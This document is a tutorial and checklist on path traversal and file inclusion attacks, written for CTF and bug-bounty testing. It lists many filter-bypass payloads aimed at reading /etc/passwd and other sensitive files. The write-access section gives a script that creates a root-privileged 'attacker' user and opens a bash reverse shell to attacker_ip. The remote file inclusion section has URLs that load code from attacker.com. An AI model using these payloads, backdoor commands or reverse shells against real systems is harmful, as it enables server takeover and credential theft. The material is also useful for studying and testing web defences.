File Inclusion/ Traversal Vulnerabilities:
===========================================

Path traversal or directory traversal is a vulnerability which allows an attacker to read arbitrary files on the server which they should not have access

This allows attackers to read files on the server including: 
a) Application code and data.
b) Credentials for back-end systems.
c) Sensitive operating system files.

The areas that need to be checked briefly are:
a)Are there request parameters which could be used for file-related operations?
c) Are there unusual file extensions?
d) Are there interesting variable names?

How to test for path traversal vulnerabilities.
a) Look for areas where the request parameter appears to contain the name of a file or directory ie "include=main.inc" or "template=/en/sidebar". So we look for any functions that tries to retrieve data from the server's file system like the images and office documents.
b) Look for any errors that are outputted once you supply data to the APIs. Sometimes the error messages give you a message saying, "No such file in /var/www/images" etc and with that you get to know the file structure of the system.
c) Modify the parameter's value by inserting an abitrary sub directory and then insert a single traversal. If the output is the same then the server has a path traversal vulnerability. 
Example:
If, http://example.com/index.php?page=images/phones/samsung.png will print a samsung.png and in the same images folder there is another folder named laptops and we do this, http://example.com/index.php?page=images/laptops/../phones/samsung.png and the server accepts that input and executes it, then there is a high possiblility of having a path traversal in that application. Now you can try accessing the \windows\win.ini in windows or /etc/passwd in linux systems.

4. If the output of the two above is different then maybe the application is blocking, stripping or sanitizing our input so we may try to encode or bypass the filters which we will do below.  

5. If the function you are attacking provides write access to files try writing two files one that you can write and another  that you cannot write. 
Example: 
Do this for windows systems;
../../../../../../../../../../../../writetest.txt
../../../../../../../../../../../../windows/system32/config/sam

Do this for unix systems;
../../../../../../../../../../../../tmp/writetest.txt
../../../../../../../../../../../../tmp

If the output in say for the linux systems is different then probably there is a vulnerability.

6. To verify this flaw with write access is to try to write a new file within the webroot of the web server and then try to retrieve it with the browser.

NB: Always check both sequences the / and the \ no matter which system you are on. Windows tolerates  both / and \ but unix systems only tolerate / but if the unix system is calling to windows back-end then it will still accept the \.

In some cases the attacker may be able to not only read the files but also write them allowing them to modify the application data and ultimately take full control of the server. 

However an attacker does not know the name or contents of files present in the server, so an attacker can look for default files present in server , like passwd file present inside etc directory in linux os. and boot.ini file present in windows os.

The checklist for this attack is:

1. Check directly for the /etc/passwd if in a linux system.
-------------------------------------------------------------
You can try adding as many "../../../../../' as possible and see whether you will retrieve it.
You can try looking for the boot.ini file in the windows OS. 

Example: 
http://example.com/index.php?page=../../../etc/passwd

2. You can also check without the "../../../" since server may be configured to block the traversal sequences. So instead of using the "../../../" no matter where you are if you just type the "/etc/passwd/" You will still get the output.
So this just checks the "../../../../../" traversal sequences.

Example: 
http://example.com/index.php?page=/etc/passwd
No "../../../" since they will be detected.

3. You can also check the traversal sequences stripped non recursively. This non recursive means that the stripes are being stripped without going back and forth. Meaning the ....// the part being removed is the ..(../)/ leaving the outer ../ and since the program is non recursive it will not come back to check the ../ it left. It means that the program is only going through that code once. If it was recursive then it would have been going back and forth many times and after the firs strip it would have come back a second time and noted that there is still a ../ left but now its non recursive.

Meaning in this we write:
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

You can also write: "..././..././..././etc/passwd" In this the (../) will be stripped leaving the (../) just as the other one.
 
This will bypass the non recursive stripping.

4.You can also check the file traversal sequences stripped with superfluous URL decode.
In this the application blocks an input containing the traversal sequences it then performs a URL decode of the input before using it. 
So in this we can bypass it by, first decoding our, "../../../etc/passwd". If we only do this once it will not work since the application first checks for the traversal sequences if they are absent then it decodes the URl. So if you encoded it once, then it will be decoded and your traversal will be visible what we do is encode it more than once, that is twice, thrice etc.

Example:
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

5. You can also check the file traversal through the, validation of start of path.
Some applications check the start of the path whether it is inline with what they start with. 
Example:  (Request) GET /image?filename=/var/www/images/74.jpg HTTP/2

In the above get request normally when checking for the file traversal, we will delete the "/var/www/images" and then put down our traversal but doing that in this application is a mistake since this application checks the start of path meaning the "/var/www/images" must be there meaning instead of deleting it we leave it there and then append the traversal on it so that the application sees it when its doing its checks and executes our command.
Example: 
http://example.com/index.php?page=/var/www/images/etc/passwd
Or, http://example.com/index.php?page=/var/www/images/../../../../../../etc/passwd.

6. You can also check the file traversal through the validation of the file extension with the null byte bypass.
In this the application is configured to validate whether the file name extension ends with the expected extension.
So in this, http://example.com/index.php?page=/var/www/images/74.jpg, the application checks to see whether the jpg will be available in the get request if its not there then it will know some malicious information has been keyed in and it will act accordingly.
So for this we will add a "%00" at the end of our "/etc/passwd" to make it "/etc/passwd%00" because of the initial .jpg extension that was there.

Example: 
http://example.com/index.php?page=/var/www/images/../../../../../../etc/passwd%00.jpg(or whatever extension you have)

Those are the six areas you can check while you are testing for file traversal in your CTFs or bug bounties.

The filter checklist. This is in as we have seen above:
1. The first input filter is obviously checking for the traversal sequences in the parameter supplied. For this you can encode your "../".
In this you can use:

1.1 The Simple URL-Encoding. 
Example:
Dot — %2e Forward slash — %2f Backslash — %5c
So, ../ = %2e%2e%2f and ..\ = %2e%2e%5c

1.2 Using the 16-bit Unicode encoding.
Example:
Dot — %u002e Forward slash — %u2215 Backslash — %u2216

1.3 The Double Encoding:
Example:
Dot — %252e Forward slash — %252f Backslash — %255c

1.4 The Overlong UTF-8 Unicode encoding:
Example: 
Dot — %c0%2e, %e0%40%ae, %c0ae
Forward slash — %c0%af, %e0%80%af, %c0%2f
Backslash — %c0%5c, %c0%80%5c

In this first checklist you can use the illigal Unicode Payload in the intruder in burp to generate a huge number of alternate representations of any character and submit them in your parameter.

2. The second filter checklist checks whether the user supplied file name (suffix) or the prefix (starting directory) is what it expects. Ie you have put your /etc/passwd and it was expecting a .jpg. So we bypass this by adding a null byte at the emd of our payload. Ie /etc/passwd%00.jpg.

3. Some application will monitor the starting folder. Ie if it was /var/www/images/ it will check this and when you remove it, the application will not execute your request by this can be bypassed as we saw in the above section.

4. If the application is still fighting and not allowing any traversal attacks. It shows that the application is using different types of filters. For this you need to combine different types of payloads to get you goal.

5. If an application has a read access you can use it to retrieve useful information from the server that may contain useful information.
Example:
a) password files for the OS and application.
b) Server and application configuration files.
c) Files containing database credentials.
d) Data used by the application ie MYSQL database or XML files.
e) The source code to server executable pages to perform a code review in a search of bugs. ie GetImage.aspx?file=GetImage.aspx. So alternatively looking also at its error message.
f) Application log files contain usernames and session tokens and the like.

If you find a path traversal that grants you the write access, exploit it to achieve the arbitrary execution of commands on the server. 
You can do this by:

a) creating scripts in the User's startup folders so that when they start their machines the scripts run in the background, maybe its calling a process or just connection to your device remotely.
b) Modify files such as in .ftpd to execute arbitrary commands when a user connects. These .ftpd are the ftp daemon configuration files. In this a malicious script can be written that adds a user and gives the user root privileges. #!/bin/bash

Example: Note for Educational Purposes only!!
# Add a new user with root privileges
useradd -m -p $(openssl passwd -1 'password123') attacker
usermod -aG sudo attacker

# Open a reverse shell to the attacker's machine
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

c) Write scripts to the web directory with execute permissions and call them from your browser.
Example: 
We are not creating a file but we can call it:
Original: https://testsite/foo.cgi?home=index.htm
Attack: https://testsite/foo.cgi?home=foo.cgi

The attack gives the source code of the foo.cgi as the output of the url.
You can also put it like this: 
Original: https://testsite/scripts/foo.cgi?page=menu.txt
Attack: http://testsite/scripts/foo.cgi?page=../scripts/foo.cgi%00txt

This will still give the same output. The source code of the foo.cgi.

The following URLs may be vulnerable to this attack:

https://testsite/get.php?f=list
https://testsite/get.cgi?f=5
https://testsite/get.asp?f=test

An attacker can execute this attack like this:

https://testsite/get.php?f=/var/www/html/get.php
https://testsite/get.cgi?f=/var/www/html/admin/get.inc
https://testsite/get.asp?f=/etc/passwd

When the webserver returns errors, its easier for the attacker to guess the exact location of the file with the source code.

This is traversal URl encoding: 
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../
%2e%2e%5c represents ..\
%2e%2e\ represents ..\
..%5c represents ..\
%252e%252e%255c represents ..\
..%255c represents ..\

Remote File Inclusion.
We have discussed much of the Local file inclusion trying to retrieve or read a file that is stored locally. Now we can also get files stored remotely in another system with the remote file inclusion techniques.
This is not that common since by default in php it is turned off in the "allow_url_include" configiration.
But if its turned on, maybe the administrator was doing something with it and he forgot to off it then we have our chance at this.

Example:
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
